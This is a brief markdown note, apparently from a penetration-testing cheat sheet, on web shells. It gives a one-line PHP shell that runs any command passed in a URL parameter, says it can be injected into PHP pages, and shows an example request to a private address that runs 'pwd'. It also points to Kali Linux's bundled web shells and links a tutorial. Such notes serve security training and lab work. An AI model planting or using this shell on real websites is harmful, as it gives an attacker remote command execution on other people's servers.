# Webshell

## Basic cmd-shell

This code can be injected into pages that use php.
```
<?php system($_GET['cmd']); ?>
```

You can then call then execute the commands like this:

```
http://192.168.1.103/index.php?cmd=pwd
```


You have access to different kinds of webshells on Kali here:
```
/usr/share/webshells
```

http://www.binarytides.com/web-shells-tutorial/
